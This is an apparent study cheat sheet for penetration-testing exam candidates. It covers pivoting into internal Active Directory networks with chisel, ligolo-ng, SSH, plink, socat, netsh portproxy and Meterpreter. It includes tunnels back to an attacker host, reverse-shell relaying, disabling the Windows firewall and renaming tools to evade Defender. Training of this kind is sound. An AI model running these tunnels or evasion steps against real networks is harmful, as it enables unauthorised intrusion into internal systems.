# Pivoting, Tunneling & Port Forwarding

## Why pivoting matters

Exam AD sets often place:

- One host dual-homed (reachable from exam network **and** internal LAN)
- DC / secondary hosts only on the **internal** network

Without a tunnel, you cannot scan or exploit the rest of the set from Kali.

```text
[Kali] ----entry net---- [dual-homed pivot] ----internal---- [app host] [DC]
```

## Concept map

| Technique | Use when |
|-----------|----------|
| Dynamic SOCKS (chisel/ligolo/ssh -D) | Need many tools through pivot |
| Local port forward | Reach one internal service on localhost |
| Remote port forward | Expose internal service back to Kali |
| socat / plink | Quick TCP redirects |

---

## Chisel

### Attacker (Kali)

```bash
./chisel server -p 8001 --reverse
```

### Victim (Windows/Linux)

```cmd
chisel.exe client KALI:8001 R:1080:socks
```

```bash
./chisel client KALI:8001 R:1080:socks
```

### Use SOCKS

```bash
# /etc/proxychains4.conf
# socks5 127.0.0.1 1080
proxychains -q nmap -Pn -sT -p 445,3389,5985 172.16.x.x
proxychains -q nxc smb 172.16.x.0/24 -u user -p pass
proxychains -q evil-winrm -i 172.16.x.x -u user -p pass
```

**Note:** Through SOCKS, use **TCP connect scans** (`-sT`), not default SYN, unless using advanced tooling.

---

## ligolo-ng (modern preferred by many 2025–2026 candidates)

Ligolo creates a TUN interface — many tools work **without** proxychains.

```bash
# Attacker
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Agent on victim
./agent -connect KALI:11601 -ignore-cert

# In ligolo console: session → start
sudo ip route add 172.16.x.0/24 dev ligolo
```

Then nmap/nxc as if you were on the internal network.

---

## SSH pivoting

| Flag | Direction | Typical use |
|------|-----------|-------------|
| `-L local:host:port` | Kali listens → reaches internal via pivot | Browse internal web/RDP on localhost |
| `-R [bind:]port:host:port` | Pivot (or remote) listens → reaches Kali/internal | Catch reverse shells; expose Kali service to LAN |
| `-D port` | Dynamic SOCKS on Kali through pivot | proxychains / browser SOCKS |

```bash
# Dynamic SOCKS via compromised Linux SSH
ssh -D 1080 user@pivot

# Local forward: Kali:8443 → internal:443 via pivot
ssh -L 8443:INTERNAL:443 user@pivot
# then: curl https://127.0.0.1:8443  or  rdesktop 127.0.0.1:3390 after -L 3390:INTERNAL:3389

# Remote forward: expose Kali listener to internal hosts
# (internal host connects to pivot:443 → lands on Kali:443)
ssh -R 443:127.0.0.1:443 user@pivot

# Local forward: Kali listens → reach internal WinRM/RDP/etc via pivot
# (run evil-winrm against localhost on Kali)
ssh -L 5985:INTERNAL:5985 user@pivot
evil-winrm -i 127.0.0.1 -u USER -p PASS

# Already inside SSH session: escape to SSH command line with ~C (sometimes)
# -L 8081:172.16.0.2:80   # expose internal:80 on Kali:8081
```

```bash
# From pivot → your Kali (when you started sshd)
ssh -R 12345:127.0.0.1:443 USER@LHOST
```

### plink (Windows pivot → Kali sshd)

When the **client** is the pivot, use **`-R`** so **Kali listens** and the pivot opens the connection to `INTERNAL` (same end-state as `ssh -L … user@pivot` run from Kali).

```cmd
:: Transfer plink.exe; Kali sshd running
:: Kali:4445 → INTERNAL:445  (INTERNAL resolved on the pivot)
plink.exe LHOST -P 22 -N -R 4445:INTERNAL:445 -l kaliuser -pw PASS
:: Kali:5985 → INTERNAL:5985  (then: evil-winrm -i 127.0.0.1 … on Kali)
plink.exe LHOST -P 22 -N -R 5985:INTERNAL:5985 -l kaliuser -pw PASS
```

---

## Chisel static tunnels (port-to-port)

Beyond SOCKS — useful for a single internal service:

```bash
# Kali
./chisel server -p 8001 --reverse -v

# Pivot: expose internal:80 as Kali:8002
./chisel client LHOST:8001 R:8002:INTERNAL:80

# Pivot: expose pivot localhost service back to Kali
./chisel client LHOST:8001 R:3000:127.0.0.1:3000

# Local tunnel (listen on pivot, send to Kali)
./chisel client LHOST:8001 9001:127.0.0.1:443
```

---

## socat

```bash
# Forward pivot:445 → internalDC:445
socat TCP-LISTEN:445,fork TCP:172.16.x.100:445

# TLS wrapper / simple relay
socat TCP-LISTEN:8083,fork TCP:INTERNAL:443
```

```bash
# ncat relay (Kali)
ncat -lvkp 12345 -c "ncat --ssl INTERNAL 443"
```

---

## Windows-native helpers

```cmd
:: netsh portproxy (admin) — listen on pivot, connect to internal
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectaddress=INTERNAL connectport=5985
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8443
```

```powershell
# OpenSSH client on modern Windows pivot → Kali
# Kali listens; pivot connects to INTERNAL (not -L — that would resolve INTERNAL on Kali)
ssh -R 3390:INTERNAL:3389 user@LHOST
# then on Kali: xfreerdp /v:127.0.0.1:3390 /u:USER /p:PASS
ssh -R 5985:INTERNAL:5985 user@LHOST
# then on Kali: evil-winrm -i 127.0.0.1 -u USER -p PASS

# Dynamic SOCKS is easier from Kali:  ssh -D 1080 user@pivot
# (OpenSSH -R is not a drop-in for -D; use chisel/ligolo for multi-tool SOCKS from Windows)
```

---

## Meterpreter / MSF pivoting (if allowed)

```text
portfwd add -l 3389 -p 3389 -r 172.16.x.x
route add 172.16.x.0 255.255.255.0 -1
# + socks module
```

Prefer non-MSF methods unless you are sure of exam rules.

---

## Double hop reverse shells

If an internal host can reach the pivot but not Kali:

1. Listener on Kali
2. Remote forward pivot → Kali:443 or chisel reverse
3. Shell from internal host to pivot:443 which lands on Kali

Or: reverse shell to the pivot, then `nc` relay.

---

## Practical exam order

1. Own dual-homed host (SYSTEM preferred)
2. Confirm routes: `route print` / `ip route`
3. Stand up **ligolo or chisel** immediately
4. Re-run discovery on internal CIDR
5. Only then attack internal hosts / DC “from Kali”

```cmd
# On Windows pivot
route print
ipconfig /all
arp -a
```

```bash
# From Kali through tunnel
nmap -Pn -sT --top-ports 100 172.16.x.0/24
```

---

## Firewall notes

```cmd
# Lab convenience only (noisy)
netsh advfirewall set allprofiles state off
```

Prefer specific allow rules when possible.

---

## Troubleshooting

| Symptom | Check |
|---------|--------|
| SOCKS works for curl, not nmap | Use `-sT`, proxychains config type socks5 |
| Kerberos fails through pivot | DNS + clock still correct; use IP + NTLM if needed |
| Agent connects, no traffic | Routes on Kali to internal via TUN/SOCKS |
| Windows Defender kills chisel | Rename, different dir, alternate tool (ligolo, ssh) |
